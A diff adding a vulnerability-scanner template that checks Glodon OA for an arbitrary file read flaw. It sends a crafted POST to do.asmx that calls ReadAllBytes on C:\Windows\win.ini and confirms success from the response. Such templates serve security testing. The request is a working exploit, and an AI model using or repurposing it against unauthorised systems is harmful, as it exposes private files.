@@ -1,0 +1,32 @@
+id: poc-yaml-glodon-do-asmx-anyfile-read
+info:
+  name: Glodon OA do.asmx Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=ReadAllBytes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        ["\"C:\\\\Windows\\\\win.ini\""]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"IsSuccess\":true"
+          - "\"StatusCode\":\"OK\""
+        condition: and
+      - type: word
+        words:
+          - "未能找到文件"
+        condition: and
+        negative: true
+      - type: regex
+        regex:
+          - "\\\"Data\\\":\\[\\[0-9,]+\\]"
